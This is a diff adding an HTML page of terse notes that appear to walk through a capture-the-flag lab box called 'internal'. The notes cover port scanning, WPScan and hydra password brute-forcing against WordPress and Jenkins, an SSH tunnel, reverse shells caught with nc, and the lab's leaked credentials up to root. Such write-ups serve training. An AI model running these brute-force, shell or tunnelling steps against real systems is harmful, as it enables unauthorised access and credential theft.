@@ -1,0 +1,51 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>internal</title>
+</head><body>nmap show open ports<br/>
+<b>80, 22</b><br/>
+<br/>
+Directory enumeration shows phpadmin and wordpress login<br/>
+<br/>
+phpadmin &gt; http://10.10.68.199/phpmyadmin/index.php<br/>
+wordpress &gt; http://10.10.68.199/blog/wp-login.php<br/>
+<br/>
+admin admin <b>failed</b><br/>
+<br/>
+Brute force WPScan<br/>
+$ wpscan --url internal.thm/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50<br/>
+[SUCCESS] - admin / my2boys<br/>
+<br/>
+**cred do not work for phpadmin<br/>
+<br/>
+Private post from admin account:<br/>
+found some creds *still do not work for php admin<br/>
+  <b>william</b>:<b>arnold147</b><br/>
+<br/>
+replaced one of the web pages with pentest monmkey php rev shell and caught it with nc. <br/>
+Go to theme editor to edit php files.<br/>
+<br/>
+once a shell has been popped you dont have much access but /opt/wp-save.txt give you these creds<br/>
+<b>aubreanna</b>:<b>bubb13guM!@#123</b><br/>
+<br/>
+i just <b>su aubreanna</b>and used the password<br/>
+<br/>
+jenkins.txt informs us of local server via port 8080<br/>
+We can ssh tunnel using the command below<br/>
+&gt; ssh -L &lt;forward to this port&gt;:&lt;LocalIP&gt;:&lt;port we are trying to access&gt; &lt;username&gt;@&lt;non local host IP&gt;<br/>
+<br/>
+&gt;ssh -L 4444:172.17.0.2:8080 aubreanna@&lt;IP&gt;<br/>
+<br/>
+**This will stay open but keep a connection so we can access via OUR browser<br/>
+<br/>
+<br/>
+hydra brute force<br/>
+&gt; hydra 127.0.0.1 -s 4444 -V -f http-form-post &quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&quot; -l admin -P /usr/share/wordlists/rockyou.txt<br/>
+[4444][http-post-form] host: 127.0.0.1  login: <b>admin</b> password: <b>spongebob<br/>
+</b><b><br/>
+jenkins reverse shell<br/>
+</b>/opt/note.txt &gt; root:tr0ub13guM!@#123<br/>
+<br/>
+go back to normal ssh session and just su root with the password above<br/>
+<br/>
+</body></html>
